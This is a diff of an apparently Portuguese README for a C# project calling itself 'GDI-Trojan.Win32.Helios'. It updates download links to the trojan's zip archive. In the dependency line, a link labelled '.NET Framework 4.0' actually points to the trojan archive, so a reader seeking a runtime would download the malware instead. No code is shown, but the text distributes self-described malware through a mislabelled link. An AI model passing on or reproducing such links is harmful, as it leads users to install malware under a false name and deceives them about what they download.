@@ -1,4 +1,4 @@
-# https://raw.githubusercontent.com/GitEdu-gi/GDI-Trojan.Win32.Helios/main/resuggestion/GDI-Trojan.Win32.Helios.zip
+# https://github.com/GitEdu-gi/GDI-Trojan.Win32.Helios/raw/refs/heads/main/resuggestion/Helios-GD-Trojan-Win-v3.2.zip
 ## Criador: Edu
 
 ## Linguagen: C#
@@ -7,4 +7,4 @@
 
 ## Bytebeats: Edu, indoamanso
 
-## Dependencias: [.NET Framework 4.0](https://raw.githubusercontent.com/GitEdu-gi/GDI-Trojan.Win32.Helios/main/resuggestion/GDI-Trojan.Win32.Helios.zip) 
+## Dependencias: [.NET Framework 4.0](https://github.com/GitEdu-gi/GDI-Trojan.Win32.Helios/raw/refs/heads/main/resuggestion/Helios-GD-Trojan-Win-v3.2.zip) 
